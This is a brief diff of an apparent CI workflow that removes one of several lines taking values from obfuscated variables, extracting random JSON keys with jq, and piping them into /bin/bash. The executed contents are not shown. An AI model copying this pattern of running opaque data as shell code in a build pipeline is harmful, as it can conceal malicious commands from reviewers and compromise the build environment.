@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$ss1678" | jq -r .g264 | /bin/bash
           printf '%s' "$b98006" | jq -r .deeb0217 | /bin/bash
           printf '%s' "$tw4" | jq -r .lwyv5701 | /bin/bash
-          printf '%s' "$kwsjw01483" | jq -r .lorrq7448 | /bin/bash
           echo $whorh9 | jq -r .mprts1186 | /bin/bash
 
       - name: Save artifact
